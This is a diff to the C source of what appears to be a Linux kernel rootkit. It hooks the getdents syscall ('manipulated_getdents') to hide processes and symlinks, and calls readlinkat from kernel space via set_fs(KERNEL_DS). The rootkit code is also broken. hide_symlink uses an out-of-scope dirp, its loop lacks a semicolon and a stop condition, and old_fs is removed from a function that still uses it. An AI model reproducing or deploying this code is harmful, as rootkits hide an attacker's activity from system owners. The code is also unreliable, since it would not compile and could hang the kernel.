@@ -67,8 +67,27 @@ int hide_process(int fd, char *d_name)
 
 int hide_symlink(int fd, char *d_name)
 {
-	// TODO: implement symlink check and read loop
+	mm_segment_t old_fs;
+	char lpath[128];
+	size_t lpath_len;
 	
+	do {
+		memset(lpath, 0, 128);	
+	
+		/* tell the kernel to ignore kernel-space memory in syscalls */
+		old_fs = get_fs();
+		set_fs(KERNEL_DS);
+	
+		/* execute our readlinkat syscall */
+		lpath_len = (*syscall_readlinkat) (fd, dirp->d_name, lpath, 128);
+	
+		/* reset the kernel */	
+		set_fs(old_fs);
+
+		// TODO: insert stop condition
+	
+	} while (lpath_len > 0)
+
 	return 0;
 }
 
@@ -102,10 +121,6 @@ asmlinkage int manipulated_getdents (unsigned int fd, struct linux_dirent __user
 	getdents_call_counter++;
 	/* nothing else above this line */
 	
-	mm_segment_t old_fs;
-	char lpath[128];
-	size_t lpath_len;
-	
 	long ret;
 	int len = 0;
 	int tlen = 0;
@@ -117,7 +132,6 @@ asmlinkage int manipulated_getdents (unsigned int fd, struct linux_dirent __user
 	{
 		len  = dirp->d_reclen;
 		tlen = tlen-len;
-		memset(lpath, 0, 128);	
 		
 		/* tell the kernel to ignore kernel-space memory in syscalls */
 		old_fs = get_fs();
